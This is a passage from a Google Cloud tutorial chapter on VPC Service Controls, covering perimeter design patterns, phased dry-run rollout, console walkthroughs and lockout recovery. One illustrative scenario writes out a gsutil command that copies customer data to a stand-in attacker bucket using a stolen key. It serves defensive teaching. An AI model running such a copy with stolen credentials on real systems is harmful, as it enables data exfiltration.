│  │  ├── Streaming pipeline SA → Pub/Sub → data-ingestion     │     │
│  │  └── BI dashboard SA → BigQuery (read-only)               │     │
│  │                                                             │     │
│  │  Egress rules:                                              │     │
│  │  └── ML SA → public datasets (read-only)                  │     │
│  │                                                             │     │
│  └─────────────────────────────────────────────────────────────┘     │
│                                                                        │
│  Result: Even with compromised credentials, an attacker cannot:      │
│  ✗ Export BigQuery data to their own project                         │
│  ✗ Copy GCS objects to external bucket                               │
│  ✗ Read data from outside the corporate network                     │
│  ✗ Access non-allowed Google APIs from VMs                           │
│                                                                        │
└──────────────────────────────────────────────────────────────────────┘
```

### Pattern 2: Gradual VPC-SC Rollout

```
┌──────────────────────────────────────────────────────────────────────┐
│     PATTERN 2: PHASED ROLLOUT WITH DRY RUN                           │
├──────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  Phase 1 (Week 1-2): Inventory                                       │
│  ┌──────────────────────────────────────────────────────────┐        │
│  │  • Identify all projects with sensitive data             │        │
│  │  • Map all data flows (ingestion, processing, export)    │        │
│  │  • Document CI/CD pipeline access patterns               │        │
│  │  • List developer access patterns (IP ranges)            │        │
│  └──────────────────────────────────────────────────────────┘        │
│                                                                        │
│  Phase 2 (Week 3-4): Dry Run                                         │
│  ┌──────────────────────────────────────────────────────────┐        │
│  │  • Create perimeter in dry-run mode                      │        │
│  │  • Monitor violation logs daily                          │        │
│  │  • Add access levels for legitimate access patterns      │        │
│  │  • Add ingress/egress rules for cross-project flows     │        │
│  └──────────────────────────────────────────────────────────┘        │
│                                                                        │
│  Phase 3 (Week 5): Enforce Non-Critical                               │
│  ┌──────────────────────────────────────────────────────────┐        │
│  │  • Enforce perimeter for staging first                   │        │
│  │  • Monitor for 1 week                                    │        │
│  │  • Fix any broken workflows                              │        │
│  └──────────────────────────────────────────────────────────┘        │
│                                                                        │
│  Phase 4 (Week 6): Enforce Production                                 │
│  ┌──────────────────────────────────────────────────────────┐        │
│  │  • Enforce perimeter for production                      │        │
│  │  • Keep dry-run overlay for future changes               │        │
│  │  • Set up alerting for violations                        │        │
│  └──────────────────────────────────────────────────────────┘        │
│                                                                        │
└──────────────────────────────────────────────────────────────────────┘
```

### Pattern 3: Multi-Team Data Sharing

```
┌──────────────────────────────────────────────────────────────────────┐
│     PATTERN 3: CONTROLLED CROSS-TEAM DATA SHARING                    │
├──────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  ┌─── Perimeter: analytics ────┐  ┌─── Perimeter: ml ─────────┐   │
│  │ project-data-warehouse      │  │ project-ml-training        │   │
│  │ project-data-pipeline       │  │ project-ml-serving         │   │
│  │                              │  │                            │   │
│  │ Services: bigquery, storage │  │ Services: aiplatform,     │   │
│  │           dataflow          │  │   storage, bigquery       │   │
│  └──────────┬───────────────────┘  └──────────┬─────────────────┘   │
│             │                                  │                     │
│             └──── Ingress/Egress Rules ────────┘                     │
│                                                                        │
│  Instead of a bridge (too broad), use targeted rules:                │
│                                                                        │
│  Analytics perimeter egress:                                          │
│  → ML training SA can read BigQuery feature tables (read-only)       │
│                                                                        │
│  ML perimeter ingress:                                                │
│  → Analytics SA can read ML model predictions (read-only)            │
│                                                                        │
│  Result:                                                               │
│  • ML team can read features from analytics (not write)               │
│  • Analytics team can read predictions from ML (not write)           │
│  • Neither can exfiltrate the other's data outside GCP               │
│  • Neither can access any other service in the other perimeter       │
│                                                                        │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Quick Reference

| Action | Command |
|--------|---------|
| Create access policy | `gcloud access-context-manager policies create --organization=ORG --title="T"` |
| Create access level | `gcloud access-context-manager levels create NAME --policy=P --basic-level-spec=FILE` |
| Create perimeter | `gcloud access-context-manager perimeters create NAME --policy=P --resources=... --restricted-services=...` |
| Create dry-run | `gcloud access-context-manager perimeters dry-run create NAME --policy=P ...` |
| Enforce dry-run | `gcloud access-context-manager perimeters dry-run enforce NAME --policy=P` |
| Create bridge | `--perimeter-type=bridge` |
| Set ingress policy | `--set-ingress-policies=ingress.yaml` |
| Set egress policy | `--set-egress-policies=egress.yaml` |
| Set VPC accessible services | `--enable-vpc-accessible-services --vpc-allowed-services=...` |
| Find violations | Filter audit logs for `VpcServiceControlAuditMetadata` |
| Admin role | `roles/accesscontextmanager.policyAdmin` |

---

## What is VPC Service Controls? (Beginner Explanation)

### Simple Analogy

```
┌──────────────────────────────────────────────────────────────┐
│         VPC-SC IN PLAIN ENGLISH                                │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Think of VPC Service Controls as a FIREWALL FOR GOOGLE      │
│  CLOUD APIs — it blocks data from leaving your defined       │
│  perimeter.                                                    │
│                                                                │
│  Imagine your company's data is inside a vault:               │
│                                                                │
│  Without VPC-SC (IAM only):                                    │
│  ┌──────────────────────────────────────────────────────┐    │
│  │  🏢 Your Company Data                                │    │
│  │  ┌──────────┐                                        │    │
│  │  │ BigQuery │ ─── Someone with a stolen key ──→ 🌍   │    │
│  │  │ dataset  │     can COPY data to their own          │    │
│  │  └──────────┘     Google project. IAM said "yes"     │    │
│  │                   because the key was valid.          │    │
│  └──────────────────────────────────────────────────────┘    │
│                                                                │
│  With VPC-SC:                                                  │
│  ┌──────────────────────────────────────────────────────┐    │
│  │  🏢 Your Company Data (inside perimeter)             │    │
│  │  ┌──────────┐                                        │    │
│  │  │ BigQuery │ ─── Someone with a stolen key ──→ 🚫   │    │
│  │  │ dataset  │     tries to copy data out, but         │    │
│  │  └──────────┘     VPC-SC says: "You're not inside    │    │
│  │                   the perimeter. BLOCKED."            │    │
│  │                                                      │    │
│  │  Only requests from YOUR approved networks/devices    │    │
│  │  can touch data inside the perimeter.                 │    │
│  └──────────────────────────────────────────────────────┘    │
│                                                                │
│  Key takeaway:                                                 │
│  IAM = who has permission (identity check)                    │
│  VPC-SC = where is the request coming from (context check)   │
│  Both must pass. Stolen credentials alone aren't enough.     │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### Why It Matters — Data Exfiltration Prevention

```
Real-world scenario without VPC-SC:

1. Attacker phishes a developer and steals a service account key
2. Key has roles/storage.objectViewer on your production bucket
3. Attacker runs: gsutil cp gs://your-prod-bucket/customer-data.csv gs://attacker-bucket/
4. IAM allows it — the key is valid, the role grants read access
5. Customer data is exfiltrated ❌

Same scenario WITH VPC-SC:

1. Attacker steals the same service account key
2. Key has roles/storage.objectViewer (same as before)
3. Attacker runs the same gsutil cp command from their laptop
4. IAM check passes (valid key + correct role)
5. VPC-SC check FAILS — attacker's IP is not in the access level
6. Request blocked with 403: "Request is prohibited by organization's policy"
7. Customer data stays safe ✓

VPC-SC is your LAST LINE OF DEFENSE against credential theft.
Even if IAM is compromised, the data cannot leave the perimeter.
```

---

## Console Walkthrough: Creating & Managing Perimeters

### Creating a Service Perimeter from Console

```
Step 1: Navigate to VPC Service Controls
──────────────────────────────────────────
Console → Security → VPC Service Controls
(Or search "VPC Service Controls" in the Console search bar)

Note: VPC Service Controls is an ORGANIZATION-level feature.
You must have an organization and the role:
roles/accesscontextmanager.policyAdmin

Step 2: Select or Create an Access Policy
──────────────────────────────────────────
• If this is your first time, you'll be prompted to create an
  access policy. Click "Create Policy".
• Give it a title (e.g., "Organization Access Policy")
• An organization can have only ONE default access policy

Step 3: Create a New Perimeter
──────────────────────────────
• Click "+ New Perimeter" at the top
• Fill in the form:

  ┌──────────────────────────────────────────────────────┐
  │  Perimeter title:  prod-data-perimeter               │
  │                                                      │
  │  Perimeter type:   ○ Regular perimeter                │
  │                    ○ Perimeter bridge                 │
  │  (Select "Regular perimeter" for standard use)       │
  │                                                      │
  │  Configuration type:                                  │
  │    ○ Enforced (blocks violations immediately)         │
  │    ○ Dry run  (logs violations without blocking)     │
  │  (Start with "Dry run" if unsure)                    │
  └──────────────────────────────────────────────────────┘

Step 4: Add Projects to the Perimeter
──────────────────────────────────────
• Under "Resources" → click "Add Resources"
• Search for projects by name or number
• Select the projects that contain sensitive data
• Click "Add Selected Resources"

Step 5: Select Restricted Services
──────────────────────────────────
• Under "Restricted Services" → click "Add Services"
• Select services to protect:
  ✓ Cloud Storage
  ✓ BigQuery
  ✓ Cloud SQL
  ✓ Secret Manager
  (select all services that handle sensitive data)
• Or click "Add All Supported Services" for maximum protection

Step 6: Add Access Levels (optional but recommended)
─────────────────────────────────────────────────────
• Under "Access Levels" → select existing access levels
• These define WHO can cross the perimeter boundary
  (e.g., corporate network IPs, managed devices)
• If you don't have access levels yet, create them first
  (see "Configure Access Levels" below)

Step 7: Add Ingress/Egress Rules (optional)
───────────────────────────────────────────
• Under "Ingress Policy" → click "Add Rule"
  → Define who can access IN from outside the perimeter
• Under "Egress Policy" → click "Add Rule"
  → Define who can access OUT from inside the perimeter

Step 8: Save
────────────
• Click "Create Perimeter"
• The perimeter takes effect within minutes
• If dry-run: violations are logged, not blocked
• If enforced: violations are blocked immediately
```

### Configuring Access Levels

```
Step 1: Navigate to Access Levels
──────────────────────────────────
Console → Security → VPC Service Controls → Access Levels tab
(Or: Security → Access Context Manager)

Step 2: Create a New Access Level
──────────────────────────────────
• Click "+ Create Access Level"
• Fill in:

  ┌──────────────────────────────────────────────────────┐
  │  Title:      corp-network                             │
  │  Description: Corporate office IP ranges              │
  │                                                      │
  │  Conditions:                                          │
  │  ┌──────────────────────────────────────────────┐    │
  │  │  IP Subnetworks: 203.0.113.0/24              │    │
  │  │                  198.51.100.0/24              │    │
  │  │  (Add your office/VPN IP ranges here)        │    │
  │  └──────────────────────────────────────────────┘    │
  │                                                      │
  │  Or choose other condition types:                    │
  │  • Device Policy (managed devices, encryption)       │
  │  • Members (specific users/SAs)                      │
  │  • Regions (geographic restrictions)                 │
  │                                                      │
  │  Combining: conditions in ONE level = AND            │
  │  Multiple levels on a perimeter = OR                 │
  └──────────────────────────────────────────────────────┘

• Click "Save"
• Now attach this access level to your perimeter
  (edit perimeter → Access Levels → select the level)
```

### Enabling Dry-Run Mode

```
Dry-run mode lets you TEST perimeter policies without breaking
anything. Violations are logged but NOT blocked.

Option A: Create a NEW perimeter in dry-run mode
────────────────────────────────────────────────
• When creating a perimeter, under "Configuration type":
  Select "Dry run" instead of "Enforced"
• Everything else is the same
• Violations appear in Cloud Logging with dryRun=true

Option B: Add dry-run overlay to an EXISTING enforced perimeter
──────────────────────────────────────────────────────────────
• Edit your enforced perimeter
• Under "Dry-run configuration" → click "Edit"
• Modify the dry-run config (add services, change rules)
• Save → the dry-run overlay runs alongside the enforced policy
• Review logs to see what the NEW config would block

Viewing Dry-Run Violations:
──────────────────────────
Console → Logging → Logs Explorer
Filter:
  protoPayload.metadata.dryRun=true
  protoPayload.metadata.@type="type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata"

Promoting Dry-Run to Enforced:
─────────────────────────────
• Once you're satisfied with no unexpected violations:
• Edit perimeter → Change configuration type to "Enforced"
• Or via gcloud:
  gcloud access-context-manager perimeters dry-run enforce PERIMETER_NAME \
      --policy=POLICY_ID
```

### Deleting a Perimeter from Console

```
Step 1: Navigate to VPC Service Controls
──────────────────────────────────────────
Console → Security → VPC Service Controls

Step 2: Select the Perimeter
────────────────────────────
• Find the perimeter in the list
• Click on the perimeter name to open it

Step 3: Delete
──────────────
• Click the "Delete" button (trash icon or "Delete Perimeter")
• Confirm the deletion

⚠️  WARNING: Deleting an enforced perimeter IMMEDIATELY removes
all protection. Any previously blocked requests will now succeed.
This includes requests from outside your organization.

Best practice: Switch to dry-run mode first, wait a few days,
then delete — so you can verify nothing breaks.
```

### Troubleshooting: "I Locked Myself Out" Recovery Steps

```
┌──────────────────────────────────────────────────────────────┐
│         🚨 LOCKED OUT? RECOVERY GUIDE                        │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Symptom: After enabling VPC-SC, you can't access your      │
│  own resources. Console shows errors, gsutil/bq fails with  │
│  403 "Request is prohibited by organization's policy."      │
│                                                                │
│  This happens because YOUR IP / device / identity is NOT    │
│  in the access level. The perimeter is blocking YOU too.    │
│                                                                │
│  Recovery Steps:                                               │
│  ────────────────                                              │
│                                                                │
│  Step 1: DON'T PANIC — VPC-SC is managed at the org level  │
│  Your access to VPC Service Controls itself (the config     │
│  UI) is NOT blocked by VPC-SC. You can still edit the       │
│  perimeter from Console.                                     │
│                                                                │
│  Step 2: Find your current IP address                        │
│  Go to: https://checkip.amazonaws.com or similar            │
│  Note your IP (e.g., 45.67.89.100)                          │
│                                                                │
│  Step 3: Add your IP to an access level                      │
│  Console → Security → VPC Service Controls → Access Levels  │
│  • Edit existing access level (e.g., "corp-network")        │
│  • Add your IP to the IP Subnetworks list                   │
│  • Save                                                      │
│                                                                │
│  Step 4: Verify the access level is attached to perimeter    │
│  • Edit the perimeter → Access Levels                        │
│  • Make sure your access level is selected                   │
│  • Save                                                      │
│                                                                │
│  Step 5: Wait 1-2 minutes for propagation, then retry       │
│                                                                │
│  Alternative (faster):                                        │
│  If you need immediate access, you can TEMPORARILY:          │
│  • Switch the perimeter to dry-run mode                      │
│    (violations logged but not blocked)                       │
│  • Fix the access levels                                     │
│  • Switch back to enforced mode                              │
│                                                                │
│  Nuclear option (if nothing works):                           │
│  • Delete the perimeter entirely                             │
│  • Recreate it with correct access levels                    │
│  • Use dry-run mode first this time!                         │
│                                                                │
│  Prevention:                                                   │
│  ✓ ALWAYS start with dry-run mode                            │
│  ✓ ALWAYS include your IP/network in an access level        │
│  ✓ Test with dry-run for at least 1 week before enforcing   │
│  ✓ Keep a break-glass access level with your admin IPs      │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

---

## What's Next?

Continue to **Chapter 44: Certificate Manager** → `44-certificate-manager.md`
